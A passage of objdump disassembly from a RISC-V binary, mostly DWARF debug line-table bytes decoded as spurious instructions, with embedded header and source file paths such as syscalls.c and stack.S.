     56a:	04090603          	lb	a2,64(s2)
     56e:	0100                	addi	s0,sp,128
     570:	02090103          	lb	sp,32(s2)
     574:	0100                	addi	s0,sp,128
     576:	08090103          	lb	sp,128(s2)
     57a:	0100                	addi	s0,sp,128
     57c:	02090403          	lb	s0,32(s2)
     580:	0100                	addi	s0,sp,128
     582:	08090303          	lb	t1,128(s2)
     586:	0100                	addi	s0,sp,128
     588:	04090303          	lb	t1,64(s2)
     58c:	0100                	addi	s0,sp,128
     58e:	04090203          	lb	tp,64(s2)
     592:	0100                	addi	s0,sp,128
     594:	04090103          	lb	sp,64(s2)
     598:	0100                	addi	s0,sp,128
     59a:	04090103          	lb	sp,64(s2)
     59e:	0100                	addi	s0,sp,128
     5a0:	04090103          	lb	sp,64(s2)
     5a4:	0100                	addi	s0,sp,128
     5a6:	04090103          	lb	sp,64(s2)
     5aa:	0100                	addi	s0,sp,128
     5ac:	04090103          	lb	sp,64(s2)
     5b0:	0100                	addi	s0,sp,128
     5b2:	04090103          	lb	sp,64(s2)
     5b6:	0100                	addi	s0,sp,128
     5b8:	04090103          	lb	sp,64(s2)
     5bc:	0100                	addi	s0,sp,128
     5be:	04090103          	lb	sp,64(s2)
     5c2:	0100                	addi	s0,sp,128
     5c4:	04090103          	lb	sp,64(s2)
     5c8:	0100                	addi	s0,sp,128
     5ca:	04090103          	lb	sp,64(s2)
     5ce:	0100                	addi	s0,sp,128
     5d0:	04090103          	lb	sp,64(s2)
     5d4:	0100                	addi	s0,sp,128
     5d6:	04090103          	lb	sp,64(s2)
     5da:	0100                	addi	s0,sp,128
     5dc:	04090103          	lb	sp,64(s2)
     5e0:	0100                	addi	s0,sp,128
     5e2:	04090103          	lb	sp,64(s2)
     5e6:	0100                	addi	s0,sp,128
     5e8:	04090103          	lb	sp,64(s2)
     5ec:	0100                	addi	s0,sp,128
     5ee:	04090103          	lb	sp,64(s2)
     5f2:	0100                	addi	s0,sp,128
     5f4:	04090103          	lb	sp,64(s2)
     5f8:	0100                	addi	s0,sp,128
     5fa:	04090103          	lb	sp,64(s2)
     5fe:	0100                	addi	s0,sp,128
     600:	04090103          	lb	sp,64(s2)
     604:	0100                	addi	s0,sp,128
     606:	04090103          	lb	sp,64(s2)
     60a:	0100                	addi	s0,sp,128
     60c:	04090103          	lb	sp,64(s2)
     610:	0100                	addi	s0,sp,128
     612:	04090103          	lb	sp,64(s2)
     616:	0100                	addi	s0,sp,128
     618:	04090103          	lb	sp,64(s2)
     61c:	0100                	addi	s0,sp,128
     61e:	04090103          	lb	sp,64(s2)
     622:	0100                	addi	s0,sp,128
     624:	04090103          	lb	sp,64(s2)
     628:	0100                	addi	s0,sp,128
     62a:	04090103          	lb	sp,64(s2)
     62e:	0100                	addi	s0,sp,128
     630:	04090103          	lb	sp,64(s2)
     634:	0100                	addi	s0,sp,128
     636:	04090103          	lb	sp,64(s2)
     63a:	0100                	addi	s0,sp,128
     63c:	04090103          	lb	sp,64(s2)
     640:	0100                	addi	s0,sp,128
     642:	04090103          	lb	sp,64(s2)
     646:	0100                	addi	s0,sp,128
     648:	04090103          	lb	sp,64(s2)
     64c:	0100                	addi	s0,sp,128
     64e:	04090503          	lb	a0,64(s2)
     652:	0100                	addi	s0,sp,128
     654:	08090103          	lb	sp,128(s2)
     658:	0100                	addi	s0,sp,128
     65a:	04090503          	lb	a0,64(s2)
     65e:	0100                	addi	s0,sp,128
     660:	08090403          	lb	s0,128(s2)
     664:	0100                	addi	s0,sp,128
     666:	08090103          	lb	sp,128(s2)
     66a:	0100                	addi	s0,sp,128
     66c:	04090303          	lb	t1,64(s2)
     670:	0100                	addi	s0,sp,128
     672:	04090203          	lb	tp,64(s2)
     676:	0100                	addi	s0,sp,128
     678:	02090203          	lb	tp,32(s2)
     67c:	0100                	addi	s0,sp,128
     67e:	04090403          	lb	s0,64(s2)
     682:	0100                	addi	s0,sp,128
     684:	04090103          	lb	sp,64(s2)
     688:	0100                	addi	s0,sp,128
     68a:	02090103          	lb	sp,32(s2)
     68e:	0100                	addi	s0,sp,128
     690:	04090103          	lb	sp,64(s2)
     694:	0100                	addi	s0,sp,128
     696:	02090103          	lb	sp,32(s2)
     69a:	0100                	addi	s0,sp,128
     69c:	02090203          	lb	tp,32(s2)
     6a0:	0100                	addi	s0,sp,128
     6a2:	04090403          	lb	s0,64(s2)
     6a6:	0100                	addi	s0,sp,128
     6a8:	02090303          	lb	t1,32(s2)
     6ac:	0100                	addi	s0,sp,128
     6ae:	02090103          	lb	sp,32(s2)
     6b2:	0100                	addi	s0,sp,128
     6b4:	02090103          	lb	sp,32(s2)
     6b8:	0100                	addi	s0,sp,128
     6ba:	02090103          	lb	sp,32(s2)
     6be:	0100                	addi	s0,sp,128
     6c0:	02090103          	lb	sp,32(s2)
     6c4:	0100                	addi	s0,sp,128
     6c6:	02090103          	lb	sp,32(s2)
     6ca:	0100                	addi	s0,sp,128
     6cc:	02090103          	lb	sp,32(s2)
     6d0:	0100                	addi	s0,sp,128
     6d2:	02090103          	lb	sp,32(s2)
     6d6:	0100                	addi	s0,sp,128
     6d8:	02090103          	lb	sp,32(s2)
     6dc:	0100                	addi	s0,sp,128
     6de:	02090103          	lb	sp,32(s2)
     6e2:	0100                	addi	s0,sp,128
     6e4:	02090103          	lb	sp,32(s2)
     6e8:	0100                	addi	s0,sp,128
     6ea:	02090103          	lb	sp,32(s2)
     6ee:	0100                	addi	s0,sp,128
     6f0:	02090103          	lb	sp,32(s2)
     6f4:	0100                	addi	s0,sp,128
     6f6:	02090103          	lb	sp,32(s2)
     6fa:	0100                	addi	s0,sp,128
     6fc:	02090103          	lb	sp,32(s2)
     700:	0100                	addi	s0,sp,128
     702:	02090103          	lb	sp,32(s2)
     706:	0100                	addi	s0,sp,128
     708:	02090103          	lb	sp,32(s2)
     70c:	0100                	addi	s0,sp,128
     70e:	02090103          	lb	sp,32(s2)
     712:	0100                	addi	s0,sp,128
     714:	02090103          	lb	sp,32(s2)
     718:	0100                	addi	s0,sp,128
     71a:	02090103          	lb	sp,32(s2)
     71e:	0100                	addi	s0,sp,128
     720:	02090103          	lb	sp,32(s2)
     724:	0100                	addi	s0,sp,128
     726:	02090103          	lb	sp,32(s2)
     72a:	0100                	addi	s0,sp,128
     72c:	02090103          	lb	sp,32(s2)
     730:	0100                	addi	s0,sp,128
     732:	02090103          	lb	sp,32(s2)
     736:	0100                	addi	s0,sp,128
     738:	02090103          	lb	sp,32(s2)
     73c:	0100                	addi	s0,sp,128
     73e:	02090103          	lb	sp,32(s2)
     742:	0100                	addi	s0,sp,128
     744:	02090103          	lb	sp,32(s2)
     748:	0100                	addi	s0,sp,128
     74a:	02090103          	lb	sp,32(s2)
     74e:	0100                	addi	s0,sp,128
     750:	02090103          	lb	sp,32(s2)
     754:	0100                	addi	s0,sp,128
     756:	02090103          	lb	sp,32(s2)
     75a:	0100                	addi	s0,sp,128
     75c:	02090103          	lb	sp,32(s2)
     760:	0100                	addi	s0,sp,128
     762:	02090303          	lb	t1,32(s2)
     766:	0100                	addi	s0,sp,128
     768:	04090303          	lb	t1,64(s2)
     76c:	0100                	addi	s0,sp,128
     76e:	04090303          	lb	t1,64(s2)
     772:	0100                	addi	s0,sp,128
     774:	02090303          	lb	t1,32(s2)
     778:	0100                	addi	s0,sp,128
     77a:	04090303          	lb	t1,64(s2)
     77e:	0100                	addi	s0,sp,128
     780:	04090303          	lb	t1,64(s2)
     784:	0100                	addi	s0,sp,128
     786:	08090103          	lb	sp,128(s2)
     78a:	0100                	addi	s0,sp,128
     78c:	04090203          	lb	tp,64(s2)
     790:	0100                	addi	s0,sp,128
     792:	02090103          	lb	sp,32(s2)
     796:	0100                	addi	s0,sp,128
     798:	02090103          	lb	sp,32(s2)
     79c:	0100                	addi	s0,sp,128
     79e:	02090103          	lb	sp,32(s2)
     7a2:	0100                	addi	s0,sp,128
     7a4:	02090103          	lb	sp,32(s2)
     7a8:	0100                	addi	s0,sp,128
     7aa:	02090103          	lb	sp,32(s2)
     7ae:	0100                	addi	s0,sp,128
     7b0:	02090103          	lb	sp,32(s2)
     7b4:	0100                	addi	s0,sp,128
     7b6:	02090103          	lb	sp,32(s2)
     7ba:	0100                	addi	s0,sp,128
     7bc:	02090103          	lb	sp,32(s2)
     7c0:	0100                	addi	s0,sp,128
     7c2:	02090103          	lb	sp,32(s2)
     7c6:	0100                	addi	s0,sp,128
     7c8:	02090103          	lb	sp,32(s2)
     7cc:	0100                	addi	s0,sp,128
     7ce:	02090103          	lb	sp,32(s2)
     7d2:	0100                	addi	s0,sp,128
     7d4:	02090103          	lb	sp,32(s2)
     7d8:	0100                	addi	s0,sp,128
     7da:	02090103          	lb	sp,32(s2)
     7de:	0100                	addi	s0,sp,128
     7e0:	02090103          	lb	sp,32(s2)
     7e4:	0100                	addi	s0,sp,128
     7e6:	02090103          	lb	sp,32(s2)
     7ea:	0100                	addi	s0,sp,128
     7ec:	02090103          	lb	sp,32(s2)
     7f0:	0100                	addi	s0,sp,128
     7f2:	02090103          	lb	sp,32(s2)
     7f6:	0100                	addi	s0,sp,128
     7f8:	02090103          	lb	sp,32(s2)
     7fc:	0100                	addi	s0,sp,128
     7fe:	02090103          	lb	sp,32(s2)
     802:	0100                	addi	s0,sp,128
     804:	02090103          	lb	sp,32(s2)
     808:	0100                	addi	s0,sp,128
     80a:	02090103          	lb	sp,32(s2)
     80e:	0100                	addi	s0,sp,128
     810:	02090103          	lb	sp,32(s2)
     814:	0100                	addi	s0,sp,128
     816:	02090103          	lb	sp,32(s2)
     81a:	0100                	addi	s0,sp,128
     81c:	02090103          	lb	sp,32(s2)
     820:	0100                	addi	s0,sp,128
     822:	02090103          	lb	sp,32(s2)
     826:	0100                	addi	s0,sp,128
     828:	02090103          	lb	sp,32(s2)
     82c:	0100                	addi	s0,sp,128
     82e:	02090103          	lb	sp,32(s2)
     832:	0100                	addi	s0,sp,128
     834:	02090103          	lb	sp,32(s2)
     838:	0100                	addi	s0,sp,128
     83a:	02090103          	lb	sp,32(s2)
     83e:	0100                	addi	s0,sp,128
     840:	02090103          	lb	sp,32(s2)
     844:	0100                	addi	s0,sp,128
     846:	02090203          	lb	tp,32(s2)
     84a:	0100                	addi	s0,sp,128
     84c:	02090103          	lb	sp,32(s2)
     850:	0100                	addi	s0,sp,128
     852:	0409                	addi	s0,s0,2
     854:	0000                	unimp
     856:	0101                	addi	sp,sp,0
     858:	0088                	addi	a0,sp,64
     85a:	0000                	unimp
     85c:	0002                	c.slli	zero,0x0
     85e:	0022                	c.slli	zero,0x8
     860:	0000                	unimp
     862:	0101                	addi	sp,sp,0
     864:	000d0efb          	0xd0efb
     868:	0101                	addi	sp,sp,0
     86a:	0101                	addi	sp,sp,0
     86c:	0000                	unimp
     86e:	0100                	addi	s0,sp,128
     870:	0000                	unimp
     872:	7301                	lui	t1,0xfffe0
     874:	6372                	ld	t1,280(sp)
     876:	0000                	unimp
     878:	63617473          	csrrci	s0,0x636,2
     87c:	00532e6b          	0x532e6b
     880:	0001                	nop
     882:	0000                	unimp
     884:	0900                	addi	s0,sp,144
     886:	ce02                	sw	zero,28(sp)
     888:	0015                	c.nop	5
     88a:	0080                	addi	s0,sp,64
     88c:	0000                	unimp
     88e:	1700                	addi	s0,sp,928
     890:	02090103          	lb	sp,32(s2)
     894:	0100                	addi	s0,sp,128
     896:	02090403          	lb	s0,32(s2)
     89a:	0100                	addi	s0,sp,128
     89c:	02090103          	lb	sp,32(s2)
     8a0:	0100                	addi	s0,sp,128
     8a2:	04090103          	lb	sp,64(s2)
     8a6:	0100                	addi	s0,sp,128
     8a8:	04090103          	lb	sp,64(s2)
     8ac:	0100                	addi	s0,sp,128
     8ae:	04090103          	lb	sp,64(s2)
     8b2:	0100                	addi	s0,sp,128
     8b4:	04090103          	lb	sp,64(s2)
     8b8:	0100                	addi	s0,sp,128
     8ba:	04090103          	lb	sp,64(s2)
     8be:	0100                	addi	s0,sp,128
     8c0:	04090103          	lb	sp,64(s2)
     8c4:	0100                	addi	s0,sp,128
     8c6:	04090103          	lb	sp,64(s2)
     8ca:	0100                	addi	s0,sp,128
     8cc:	04090103          	lb	sp,64(s2)
     8d0:	0100                	addi	s0,sp,128
     8d2:	04090103          	lb	sp,64(s2)
     8d6:	0100                	addi	s0,sp,128
     8d8:	02090303          	lb	t1,32(s2)
     8dc:	0100                	addi	s0,sp,128
     8de:	0209                	addi	tp,tp,2
     8e0:	0000                	unimp
     8e2:	0101                	addi	sp,sp,0
     8e4:	1171                	addi	sp,sp,-4
     8e6:	0000                	unimp
     8e8:	01f60003          	lb	zero,31(a2)
     8ec:	0000                	unimp
     8ee:	0101                	addi	sp,sp,0
     8f0:	000d0efb          	0xd0efb
     8f4:	0101                	addi	sp,sp,0
     8f6:	0101                	addi	sp,sp,0
     8f8:	0000                	unimp
     8fa:	0100                	addi	s0,sp,128
     8fc:	0000                	unimp
     8fe:	6901                	0x6901
     900:	636e                	ld	t1,216(sp)
     902:	7300                	ld	s0,32(a4)
     904:	6372                	ld	t1,280(sp)
     906:	2f00                	fld	fs0,24(a4)
     908:	6f68                	ld	a0,216(a4)
     90a:	656d                	lui	a0,0x1b
     90c:	6568632f          	0x6568632f
     910:	676e                	ld	a4,216(sp)
     912:	6978                	ld	a4,208(a0)
     914:	6f61                	lui	t5,0x18
     916:	7579                	lui	a0,0xffffe
     918:	6968632f          	0x6968632f
     91c:	7970                	ld	a2,240(a0)
     91e:	7261                	lui	tp,0xffff8
     920:	2f64                	fld	fs1,216(a4)
     922:	632e                	ld	t1,200(sp)
     924:	61646e6f          	jal	t3,46f3a <_tbss_end+0x46eb6>
     928:	652d                	lui	a0,0xb
     92a:	766e                	ld	a2,248(sp)
     92c:	7369722f          	0x7369722f
     930:	742d7663          	bleu	sp,s10,107c <_tbss_end+0xff8>
     934:	736c6f6f          	jal	t5,c706a <_tbss_end+0xc6fe6>
     938:	7369722f          	0x7369722f
     93c:	34367663          	bleu	gp,a2,c88 <_tbss_end+0xc04>
     940:	752d                	lui	a0,0xfffeb
     942:	6b6e                	ld	s6,216(sp)
     944:	6f6e                	ld	t5,216(sp)
     946:	652d6e77          	0x652d6e77
     94a:	666c                	ld	a1,200(a2)
     94c:	636e692f          	0x636e692f
     950:	756c                	ld	a1,232(a0)
     952:	6564                	ld	s1,200(a0)
     954:	2f00                	fld	fs0,24(a4)
     956:	6f68                	ld	a0,216(a4)
     958:	656d                	lui	a0,0x1b
     95a:	6568632f          	0x6568632f
     95e:	676e                	ld	a4,216(sp)
     960:	6978                	ld	a4,208(a0)
     962:	6f61                	lui	t5,0x18
     964:	7579                	lui	a0,0xffffe
     966:	6968632f          	0x6968632f
     96a:	7970                	ld	a2,240(a0)
     96c:	7261                	lui	tp,0xffff8
     96e:	2f64                	fld	fs1,216(a4)
     970:	632e                	ld	t1,200(sp)
     972:	61646e6f          	jal	t3,46f88 <_tbss_end+0x46f04>
     976:	652d                	lui	a0,0xb
     978:	766e                	ld	a2,248(sp)
     97a:	7369722f          	0x7369722f
     97e:	742d7663          	bleu	sp,s10,10ca <_tbss_end+0x1046>
     982:	736c6f6f          	jal	t5,c70b8 <_tbss_end+0xc7034>
     986:	7369722f          	0x7369722f
     98a:	34367663          	bleu	gp,a2,cd6 <_tbss_end+0xc52>
     98e:	752d                	lui	a0,0xfffeb
     990:	6b6e                	ld	s6,216(sp)
     992:	6f6e                	ld	t5,216(sp)
     994:	652d6e77          	0x652d6e77
     998:	666c                	ld	a1,200(a2)
     99a:	636e692f          	0x636e692f
     99e:	756c                	ld	a1,232(a0)
     9a0:	6564                	ld	s1,200(a0)
     9a2:	63616d2f          	0x63616d2f
     9a6:	6968                	ld	a0,208(a0)
     9a8:	656e                	ld	a0,216(sp)
     9aa:	2f00                	fld	fs0,24(a4)
     9ac:	6f68                	ld	a0,216(a4)
     9ae:	656d                	lui	a0,0x1b
     9b0:	6568632f          	0x6568632f
     9b4:	676e                	ld	a4,216(sp)
     9b6:	6978                	ld	a4,208(a0)
     9b8:	6f61                	lui	t5,0x18
     9ba:	7579                	lui	a0,0xffffe
     9bc:	6968632f          	0x6968632f
     9c0:	7970                	ld	a2,240(a0)
     9c2:	7261                	lui	tp,0xffff8
     9c4:	2f64                	fld	fs1,216(a4)
     9c6:	632e                	ld	t1,200(sp)
     9c8:	61646e6f          	jal	t3,46fde <_tbss_end+0x46f5a>
     9cc:	652d                	lui	a0,0xb
     9ce:	766e                	ld	a2,248(sp)
     9d0:	7369722f          	0x7369722f
     9d4:	742d7663          	bleu	sp,s10,1120 <_tbss_end+0x109c>
     9d8:	736c6f6f          	jal	t5,c710e <_tbss_end+0xc708a>
     9dc:	7369722f          	0x7369722f
     9e0:	34367663          	bleu	gp,a2,d2c <_tbss_end+0xca8>
     9e4:	752d                	lui	a0,0xfffeb
     9e6:	6b6e                	ld	s6,216(sp)
     9e8:	6f6e                	ld	t5,216(sp)
     9ea:	652d6e77          	0x652d6e77
     9ee:	666c                	ld	a1,200(a2)
     9f0:	636e692f          	0x636e692f
     9f4:	756c                	ld	a1,232(a0)
     9f6:	6564                	ld	s1,200(a0)
     9f8:	7379732f          	0x7379732f
     9fc:	2f00                	fld	fs0,24(a4)
     9fe:	6f68                	ld	a0,216(a4)
     a00:	656d                	lui	a0,0x1b
     a02:	6568632f          	0x6568632f
     a06:	676e                	ld	a4,216(sp)
     a08:	6978                	ld	a4,208(a0)
     a0a:	6f61                	lui	t5,0x18
     a0c:	7579                	lui	a0,0xffffe
     a0e:	6968632f          	0x6968632f
     a12:	7970                	ld	a2,240(a0)
     a14:	7261                	lui	tp,0xffff8
     a16:	2f64                	fld	fs1,216(a4)
     a18:	632e                	ld	t1,200(sp)
     a1a:	61646e6f          	jal	t3,47030 <_tbss_end+0x46fac>
     a1e:	652d                	lui	a0,0xb
     a20:	766e                	ld	a2,248(sp)
     a22:	7369722f          	0x7369722f
     a26:	742d7663          	bleu	sp,s10,1172 <_tbss_end+0x10ee>
     a2a:	736c6f6f          	jal	t5,c7160 <_tbss_end+0xc70dc>
     a2e:	62696c2f          	0x62696c2f
     a32:	6363672f          	0x6363672f
     a36:	7369722f          	0x7369722f
     a3a:	34367663          	bleu	gp,a2,d86 <_tbss_end+0xd02>
     a3e:	752d                	lui	a0,0xfffeb
     a40:	6b6e                	ld	s6,216(sp)
     a42:	6f6e                	ld	t5,216(sp)
     a44:	652d6e77          	0x652d6e77
     a48:	666c                	ld	a1,200(a2)
     a4a:	322e392f          	0x322e392f
     a4e:	302e                	fld	ft0,232(sp)
     a50:	636e692f          	0x636e692f
     a54:	756c                	ld	a1,232(a0)
     a56:	6564                	ld	s1,200(a0)
     a58:	0000                	unimp
     a5a:	7475                	lui	s0,0xffffd
     a5c:	6c69                	lui	s8,0x1a
     a5e:	682e                	ld	a6,200(sp)
     a60:	0100                	addi	s0,sp,128
     a62:	0000                	unimp
     a64:	63737973          	csrrci	s2,0x637,6
     a68:	6c61                	lui	s8,0x18
     a6a:	736c                	ld	a1,224(a4)
     a6c:	632e                	ld	t1,200(sp)
     a6e:	0200                	addi	s0,sp,256
     a70:	0000                	unimp
     a72:	69647473          	csrrci	s0,0x696,8
     a76:	00682e6f          	jal	t3,82a7c <_tbss_end+0x829f8>
     a7a:	5f000003          	lb	zero,1520(zero) # 5f0 <_tbss_end+0x56c>
     a7e:	6564                	ld	s1,200(a0)
     a80:	6166                	ld	sp,88(sp)
     a82:	6c75                	lui	s8,0x1d
     a84:	5f74                	lw	a3,124(a4)
     a86:	7974                	ld	a3,240(a0)
     a88:	6570                	ld	a2,200(a0)
     a8a:	00682e73          	csrrs	t3,0x6,a6
     a8e:	0004                	0x4
     a90:	5f00                	lw	s0,56(a4)
     a92:	69647473          	csrrci	s0,0x696,8
     a96:	746e                	ld	s0,248(sp)
     a98:	682e                	ld	a6,200(sp)
     a9a:	0500                	addi	s0,sp,640
     a9c:	0000                	unimp
     a9e:	64647473          	csrrci	s0,0x646,8
     aa2:	6665                	lui	a2,0x19
     aa4:	682e                	ld	a6,200(sp)
     aa6:	0600                	addi	s0,sp,768
     aa8:	0000                	unimp
     aaa:	745f 7079 7365      	0x73657079745f
     ab0:	682e                	ld	a6,200(sp)
     ab2:	0500                	addi	s0,sp,640
     ab4:	0000                	unimp
     ab6:	6572                	ld	a0,280(sp)
     ab8:	6e65                	lui	t3,0x19
     aba:	2e74                	fld	fa3,216(a2)
     abc:	0068                	addi	a0,sp,12
     abe:	0005                	c.nop	1
     ac0:	6c00                	ld	s0,24(s0)
     ac2:	2e6b636f          	jal	t1,b6da8 <_tbss_end+0xb6d24>
     ac6:	0068                	addi	a0,sp,12
     ac8:	0005                	c.nop	1
     aca:	7300                	ld	s0,32(a4)
     acc:	6474                	ld	a3,200(s0)
     ace:	7261                	lui	tp,0xffff8
     ad0:	00682e67          	0x682e67
     ad4:	0006                	c.slli	zero,0x1
     ad6:	7300                	ld	s0,32(a4)
     ad8:	7274                	ld	a3,224(a2)
     ada:	6e69                	lui	t3,0x1a
     adc:	00682e67          	0x682e67
     ae0:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
     ae4:	0105                	addi	sp,sp,1
     ae6:	0900                	addi	s0,sp,144
     ae8:	fc02                	sd	zero,56(sp)
     aea:	0015                	c.nop	5
     aec:	0080                	addi	s0,sp,64
     aee:	0000                	unimp
     af0:	0300                	addi	s0,sp,384
     af2:	0128                	addi	a0,sp,136
     af4:	14090803          	lb	a6,320(s2)
     af8:	0100                	addi	s0,sp,128
     afa:	08090303          	lb	t1,128(s2)
     afe:	0100                	addi	s0,sp,128
     b00:	14090803          	lb	a6,320(s2)
     b04:	0100                	addi	s0,sp,128
     b06:	08090303          	lb	t1,128(s2)
     b0a:	0100                	addi	s0,sp,128
     b0c:	0a05                	addi	s4,s4,1
     b0e:	14090303          	lb	t1,320(s2)
     b12:	0100                	addi	s0,sp,128
     b14:	0305                	addi	t1,t1,1
     b16:	04090003          	lb	zero,64(s2)
     b1a:	0100                	addi	s0,sp,128
     b1c:	1205                	addi	tp,tp,-31
     b1e:	02090203          	lb	tp,32(s2)
     b22:	0100                	addi	s0,sp,128
     b24:	0905                	addi	s2,s2,1
     b26:	0c090003          	lb	zero,192(s2)
     b2a:	0100                	addi	s0,sp,128
     b2c:	2005                	0x2005
     b2e:	06090003          	lb	zero,96(s2)
     b32:	0100                	addi	s0,sp,128
     b34:	1705                	addi	a4,a4,-31
     b36:	0e090003          	lb	zero,224(s2)
     b3a:	0100                	addi	s0,sp,128
     b3c:	1405                	addi	s0,s0,-31
     b3e:	06090103          	lb	sp,96(s2)
     b42:	0100                	addi	s0,sp,128
     b44:	0905                	addi	s2,s2,1
     b46:	0c090003          	lb	zero,192(s2)
     b4a:	0100                	addi	s0,sp,128
     b4c:	2405                	addiw	s0,s0,1
     b4e:	06090003          	lb	zero,96(s2)
     b52:	0100                	addi	s0,sp,128
     b54:	1905                	addi	s2,s2,-31
     b56:	0e090003          	lb	zero,224(s2)
     b5a:	0100                	addi	s0,sp,128
     b5c:	0805                	addi	a6,a6,1
     b5e:	06090103          	lb	sp,96(s2)
     b62:	0100                	addi	s0,sp,128
     b64:	1b05                	addi	s6,s6,-31
     b66:	0200                	addi	s0,sp,256
     b68:	0104                	addi	s1,sp,128
     b6a:	10090003          	lb	zero,256(s2)
     b6e:	0100                	addi	s0,sp,128
     b70:	0805                	addi	a6,a6,1
     b72:	0a090103          	lb	sp,160(s2)
     b76:	0100                	addi	s0,sp,128
     b78:	1b05                	addi	s6,s6,-31
     b7a:	0200                	addi	s0,sp,256
     b7c:	0104                	addi	s1,sp,128
     b7e:	10090003          	lb	zero,256(s2)
     b82:	0100                	addi	s0,sp,128
     b84:	0200                	addi	s0,sp,256
     b86:	0204                	addi	s1,sp,256
     b88:	0a097b03          	0xa097b03
     b8c:	0100                	addi	s0,sp,128
     b8e:	1405                	addi	s0,s0,-31
     b90:	0200                	addi	s0,sp,256
     b92:	0104                	addi	s1,sp,128
     b94:	0a090003          	lb	zero,160(s2)
     b98:	0100                	addi	s0,sp,128
     b9a:	1605                	addi	a2,a2,-31
     b9c:	0200                	addi	s0,sp,256
     b9e:	0104                	addi	s1,sp,128
     ba0:	10090003          	lb	zero,256(s2)
     ba4:	0100                	addi	s0,sp,128
     ba6:	0305                	addi	t1,t1,1
     ba8:	0200                	addi	s0,sp,256
     baa:	0104                	addi	s1,sp,128
     bac:	08090003          	lb	zero,128(s2)
     bb0:	0100                	addi	s0,sp,128
     bb2:	0d05                	addi	s10,s10,1
     bb4:	0a090703          	lb	a4,160(s2)
     bb8:	0100                	addi	s0,sp,128
     bba:	0605                	addi	a2,a2,1
     bbc:	08090003          	lb	zero,128(s2)
     bc0:	0100                	addi	s0,sp,128
     bc2:	1905                	addi	s2,s2,-31
     bc4:	0200                	addi	s0,sp,256
     bc6:	0104                	addi	s1,sp,128
     bc8:	02090003          	lb	zero,32(s2)
     bcc:	0100                	addi	s0,sp,128
     bce:	2805                	addiw	a6,a6,1
     bd0:	0200                	addi	s0,sp,256
     bd2:	0104                	addi	s1,sp,128
     bd4:	14090003          	lb	zero,320(s2)
     bd8:	0100                	addi	s0,sp,128
     bda:	1f05                	addi	t5,t5,-31
     bdc:	0200                	addi	s0,sp,256
     bde:	0104                	addi	s1,sp,128
     be0:	0e090003          	lb	zero,224(s2)
     be4:	0100                	addi	s0,sp,128
     be6:	1205                	addi	tp,tp,-31
     be8:	0200                	addi	s0,sp,256
     bea:	0104                	addi	s1,sp,128
     bec:	02090003          	lb	zero,32(s2)
     bf0:	0100                	addi	s0,sp,128
     bf2:	0c05                	addi	s8,s8,1
     bf4:	06090103          	lb	sp,96(s2)
     bf8:	0100                	addi	s0,sp,128
     bfa:	0a05                	addi	s4,s4,1
     bfc:	06090103          	lb	sp,96(s2)
     c00:	0100                	addi	s0,sp,128
     c02:	0105                	addi	sp,sp,1
     c04:	02090103          	lb	sp,32(s2)
     c08:	0100                	addi	s0,sp,128
     c0a:	08090303          	lb	t1,128(s2)
     c0e:	0100                	addi	s0,sp,128
     c10:	0a05                	addi	s4,s4,1
     c12:	14090303          	lb	t1,320(s2)
     c16:	0100                	addi	s0,sp,128
     c18:	0305                	addi	t1,t1,1
     c1a:	04090003          	lb	zero,64(s2)
     c1e:	0100                	addi	s0,sp,128
     c20:	1505                	addi	a0,a0,-31
     c22:	02090203          	lb	tp,32(s2)
     c26:	0100                	addi	s0,sp,128
     c28:	0c05                	addi	s8,s8,1
     c2a:	0c090003          	lb	zero,192(s2)
     c2e:	0100                	addi	s0,sp,128
     c30:	2305                	addiw	t1,t1,1
     c32:	06090003          	lb	zero,96(s2)
     c36:	0100                	addi	s0,sp,128
     c38:	1a05                	addi	s4,s4,-31
     c3a:	0e090003          	lb	zero,224(s2)
     c3e:	0100                	addi	s0,sp,128
     c40:	1705                	addi	a4,a4,-31
     c42:	06090103          	lb	sp,96(s2)
     c46:	0100                	addi	s0,sp,128
     c48:	0c05                	addi	s8,s8,1
     c4a:	0c090003          	lb	zero,192(s2)
     c4e:	0100                	addi	s0,sp,128
     c50:	2705                	addiw	a4,a4,1
     c52:	06090003          	lb	zero,96(s2)
     c56:	0100                	addi	s0,sp,128
     c58:	1c05                	addi	s8,s8,-31
     c5a:	0e090003          	lb	zero,224(s2)
     c5e:	0100                	addi	s0,sp,128
     c60:	1205                	addi	tp,tp,-31
     c62:	06090103          	lb	sp,96(s2)
     c66:	0100                	addi	s0,sp,128
     c68:	0905                	addi	s2,s2,1
     c6a:	14090003          	lb	zero,320(s2)
     c6e:	0100                	addi	s0,sp,128
     c70:	2205                	addiw	tp,tp,1
     c72:	04090003          	lb	zero,64(s2)
     c76:	0100                	addi	s0,sp,128
     c78:	1905                	addi	s2,s2,-31
     c7a:	14090003          	lb	zero,320(s2)
     c7e:	0100                	addi	s0,sp,128
     c80:	0f05                	addi	t5,t5,1
     c82:	04090103          	lb	sp,64(s2)
     c86:	0100                	addi	s0,sp,128
     c88:	0805                	addi	a6,a6,1
     c8a:	0c090003          	lb	zero,192(s2)
     c8e:	0100                	addi	s0,sp,128
     c90:	1f05                	addi	t5,t5,-31
     c92:	0200                	addi	s0,sp,256
     c94:	0104                	addi	s1,sp,128
     c96:	02090003          	lb	zero,32(s2)
     c9a:	0100                	addi	s0,sp,128
     c9c:	2105                	addiw	sp,sp,1
     c9e:	0200                	addi	s0,sp,256
     ca0:	0104                	addi	s1,sp,128
     ca2:	08090003          	lb	zero,128(s2)
     ca6:	0100                	addi	s0,sp,128
     ca8:	1b05                	addi	s6,s6,-31
     caa:	0200                	addi	s0,sp,256
     cac:	0204                	addi	s1,sp,256
     cae:	0a097b03          	0xa097b03
     cb2:	0100                	addi	s0,sp,128
     cb4:	1405                	addi	s0,s0,-31
     cb6:	0200                	addi	s0,sp,256
     cb8:	0104                	addi	s1,sp,128
     cba:	0a090003          	lb	zero,160(s2)
     cbe:	0100                	addi	s0,sp,128
     cc0:	1605                	addi	a2,a2,-31
     cc2:	0200                	addi	s0,sp,256
     cc4:	0104                	addi	s1,sp,128
     cc6:	10090003          	lb	zero,256(s2)
     cca:	0100                	addi	s0,sp,128
     ccc:	0305                	addi	t1,t1,1
     cce:	0200                	addi	s0,sp,256
     cd0:	0104                	addi	s1,sp,128
     cd2:	08090003          	lb	zero,128(s2)
     cd6:	0100                	addi	s0,sp,128
     cd8:	0d05                	addi	s10,s10,1
     cda:	0a090703          	lb	a4,160(s2)
     cde:	0100                	addi	s0,sp,128
     ce0:	0605                	addi	a2,a2,1
     ce2:	08090003          	lb	zero,128(s2)
     ce6:	0100                	addi	s0,sp,128
     ce8:	1905                	addi	s2,s2,-31
     cea:	0200                	addi	s0,sp,256
